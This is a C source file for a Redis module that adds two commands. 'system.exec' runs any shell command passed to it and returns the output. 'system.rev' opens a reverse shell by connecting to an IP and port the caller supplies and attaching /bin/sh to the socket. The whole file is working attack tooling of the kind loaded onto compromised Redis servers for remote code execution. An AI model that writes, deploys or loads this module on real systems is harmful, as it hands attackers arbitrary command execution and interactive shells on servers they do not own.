#include "redismodule.h"
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>   // Include for strlen() and strcat()
#include <arpa/inet.h> // Include for inet_addr()

int DoCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (argc == 2) {
        size_t cmd_len;
        size_t size = 1024;
        char *cmd = RedisModule_StringPtrLen(argv[1], &cmd_len);

        FILE *fp = popen(cmd, "r");
        if (!fp) {
            RedisModule_ReplyWithError(ctx, "Failed to run command");
            return REDISMODULE_ERR;
        }

        char *buf, *output;
        buf = (char *)malloc(size);
        output = (char *)malloc(size);
        if (!buf || !output) {
            RedisModule_ReplyWithError(ctx, "Memory allocation failed");
            return REDISMODULE_ERR;
        }

        output[0] = '\0';  // Initialize output to an empty string
        while (fgets(buf, size, fp) != NULL) {
            if (strlen(buf) + strlen(output) >= size) {
                size *= 2;  // Double the size
                output = realloc(output, size);
                if (!output) {
                    RedisModule_ReplyWithError(ctx, "Memory allocation failed");
                    return REDISMODULE_ERR;
                }
            }
            strcat(output, buf);
        }

        RedisModuleString *ret = RedisModule_CreateString(ctx, output, strlen(output));
        RedisModule_ReplyWithString(ctx, ret);
        pclose(fp);
        free(buf);
        free(output);
    } else {
        return RedisModule_WrongArity(ctx);
    }
    return REDISMODULE_OK;
}

int RevShellCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (argc == 3) {
        size_t cmd_len;
        char *ip = RedisModule_StringPtrLen(argv[1], &cmd_len);
        char *port_s = RedisModule_StringPtrLen(argv[2], &cmd_len);
        int port = atoi(port_s);
        int s;

        struct sockaddr_in sa;
        sa.sin_family = AF_INET;
        sa.sin_addr.s_addr = inet_addr(ip);
        sa.sin_port = htons(port);

        s = socket(AF_INET, SOCK_STREAM, 0);
        if (s == -1) {
            RedisModule_ReplyWithError(ctx, "Socket creation failed");
            return REDISMODULE_ERR;
        }

        if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) == -1) {
            RedisModule_ReplyWithError(ctx, "Connection failed");
            close(s);
            return REDISMODULE_ERR;
        }

        dup2(s, 0);  // Redirect stdin
        dup2(s, 1);  // Redirect stdout
        dup2(s, 2);  // Redirect stderr

        // Prepare arguments for execve
        char *const args[] = {"/bin/sh", NULL};
        execve("/bin/sh", args, NULL);

        // If execve fails
        perror("execve failed");
        close(s);
        return REDISMODULE_ERR;
    }
    return REDISMODULE_OK;
}

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (RedisModule_Init(ctx, "system", 1, REDISMODULE_APIVER_1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;

    if (RedisModule_CreateCommand(ctx, "system.exec", DoCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;

    if (RedisModule_CreateCommand(ctx, "system.rev", RevShellCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;

    return REDISMODULE_OK;
}
